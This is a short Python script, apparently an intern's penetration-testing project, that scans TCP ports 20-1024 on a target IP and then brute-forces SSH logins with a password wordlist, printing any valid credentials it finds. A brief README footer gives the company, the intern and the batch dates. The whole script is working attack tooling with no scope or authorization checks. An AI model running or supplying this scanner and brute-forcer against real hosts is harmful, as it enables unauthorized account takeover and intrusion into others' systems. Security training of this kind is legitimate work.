import socket
import threading
import paramiko
import tkinter as tk
from tkinter import filedialog, messagebox

def port_scan(target, ports):
    print(f"[*] Scanning {target}...")
    for port in ports:
        t = threading.Thread(target=scan_port, args=(target, port))
        t.start()

def scan_port(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((target, port))
        print(f"[+] Port {port} is open")
        s.close()
    except:
        pass

def ssh_brute_force(target, username, password_list):
    print("[*] Starting SSH brute force...")
    for password in password_list:
        if try_ssh_login(target, username, password.strip()):
            print(f"[+] Valid credentials found: {username}:{password}")
            break

def try_ssh_login(target, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=username, password=password, timeout=3)
        client.close()
        return True
    except:
        return False

def load_wordlist():
    file_path = filedialog.askopenfilename(title="Select Wordlist", filetypes=[("Text Files", "*.txt")])
    if file_path:
        with open(file_path, "r") as f:
            passwords = f.readlines()
        messagebox.showinfo("Wordlist Loaded", f"Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    return []

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()
    
    target_ip = input("Enter target IP: ")
    ports = list(range(20, 1025))  # Scans ports 20-1024
    
    # Run Port Scanner
    port_scan(target_ip, ports)
    
    # SSH Brute Forcing
    ssh_user = input("Enter SSH username: ")
    passwords = load_wordlist()
    if passwords:
        ssh_brute_force(target_ip, ssh_user, passwords)










# penetration-testing
**company**:CODTECH IT SOLUTIONS
**NAME**:Mayank
**INTERN ID**:CT12JMA
**domain**:cyber-security
**Batch duration**:january 5,2025 to march 5,2025
**mentor name**:neela santhosh
